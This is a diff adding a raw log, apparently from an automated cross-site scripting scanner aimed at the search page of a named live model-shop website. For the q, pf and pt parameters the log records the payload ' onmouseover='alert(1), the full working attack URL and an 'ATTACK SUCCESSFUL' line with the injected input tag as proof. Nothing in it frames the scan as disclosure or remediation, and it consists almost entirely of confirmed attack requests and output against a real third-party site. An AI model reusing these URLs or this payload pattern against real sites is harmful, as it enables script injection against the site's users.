@@ -1,0 +1,226 @@
+https://www.constructionscalemodels.com/en/search?q=bay+shore
+
+GET Params:[6]
+['q', 'pf', 'pt', 'adv', 'isc', 'sid']
+_______________________________________________________________________________________________________
+https://www.constructionscalemodels.com/en/search?q=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
+<input class=search-text type=text id=q name=q value="(uvw&#34;xyz'yxz&lt;/zxy">
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [2]
+<a href="/en/register?returnUrl=%2Fen%2Fsearch%3Fq%3D(uvw%2522xyz%27yxz%253C%2Fzxy" class=ico-register>
+<a href="/en/login?returnUrl=%2Fen%2Fsearch%3Fq%3D(uvw%2522xyz%27yxz%253C%2Fzxy" class=ico-login>
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	False	True	False
+
+Attack Payloads for ATTR
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.constructionscalemodels.com/en/search?q=' onmouseover='alert(1)
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+<input class=search-text type=text id=q name=q value="' onmouseover='alert(1)">
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+https://www.constructionscalemodels.com/en/search?q=(uvw"xyz'yxz</zxy&pf=&pt=&adv=false&isc=false&sid=false
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
+<input class=search-text type=text id=q name=q value="(uvw&#34;xyz'yxz&lt;/zxy">
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [2]
+<a href="/en/register?returnUrl=%2Fen%2Fsearch%3Fq%3D(uvw%2522xyz%27yxz%253C%2Fzxy%26pf%3D%26pt%3D%26adv%3Dfalse%26isc%3Dfalse%26sid%3Dfalse" class=ico-register>
+<a href="/en/login?returnUrl=%2Fen%2Fsearch%3Fq%3D(uvw%2522xyz%27yxz%253C%2Fzxy%26pf%3D%26pt%3D%26adv%3Dfalse%26isc%3Dfalse%26sid%3Dfalse" class=ico-login>
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	False	True	False
+
+Attack Payloads for ATTR
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.constructionscalemodels.com/en/search?q=' onmouseover='alert(1)&pf=&pt=&adv=false&isc=false&sid=false
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+<input class=search-text type=text id=q name=q value="' onmouseover='alert(1)">
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+https://www.constructionscalemodels.com/en/search?q=bay shore&pf=(uvw"xyz'yxz</zxy&pt=&adv=false&isc=false&sid=false
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
+<input class=price-from aria-label=From type=text id=pf name=pf value="(uvw&#34;xyz'yxz&lt;/zxy">
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [2]
+<a href="/en/register?returnUrl=%2Fen%2Fsearch%3Fq%3Dbay%2520shore%26pf%3D(uvw%2522xyz%27yxz%253C%2Fzxy%26pt%3D%26adv%3Dfalse%26isc%3Dfalse%26sid%3Dfalse" class=ico-register>
+<a href="/en/login?returnUrl=%2Fen%2Fsearch%3Fq%3Dbay%2520shore%26pf%3D(uvw%2522xyz%27yxz%253C%2Fzxy%26pt%3D%26adv%3Dfalse%26isc%3Dfalse%26sid%3Dfalse" class=ico-login>
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	False	True	False
+
+Attack Payloads for ATTR
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.constructionscalemodels.com/en/search?q=bay shore&pf=' onmouseover='alert(1)&pt=&adv=false&isc=false&sid=false
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+<input class=price-from aria-label=From type=text id=pf name=pf value="' onmouseover='alert(1)">
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+https://www.constructionscalemodels.com/en/search?q=bay shore&pf=&pt=(uvw"xyz'yxz</zxy&adv=false&isc=false&sid=false
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
+<input class=price-to aria-label=to type=text id=pt name=pt value="(uvw&#34;xyz'yxz&lt;/zxy">
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [2]
+<a href="/en/register?returnUrl=%2Fen%2Fsearch%3Fq%3Dbay%2520shore%26pf%3D%26pt%3D(uvw%2522xyz%27yxz%253C%2Fzxy%26adv%3Dfalse%26isc%3Dfalse%26sid%3Dfalse" class=ico-register>
+<a href="/en/login?returnUrl=%2Fen%2Fsearch%3Fq%3Dbay%2520shore%26pf%3D%26pt%3D(uvw%2522xyz%27yxz%253C%2Fzxy%26adv%3Dfalse%26isc%3Dfalse%26sid%3Dfalse" class=ico-login>
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	False	True	False
+
+Attack Payloads for ATTR
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.constructionscalemodels.com/en/search?q=bay shore&pf=&pt=' onmouseover='alert(1)&adv=false&isc=false&sid=false
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+<input class=price-to aria-label=to type=text id=pt name=pt value="' onmouseover='alert(1)">
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+https://www.constructionscalemodels.com/en/search?q=bay shore&pf=&pt=&adv=(uvw"xyz'yxz</zxy&isc=false&sid=false
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+_______________________________________________________________________________________________________
+https://www.constructionscalemodels.com/en/search?q=bay shore&pf=&pt=&adv=false&isc=(uvw"xyz'yxz</zxy&sid=false
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+_______________________________________________________________________________________________________
+https://www.constructionscalemodels.com/en/search?q=bay shore&pf=&pt=&adv=false&isc=false&sid=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
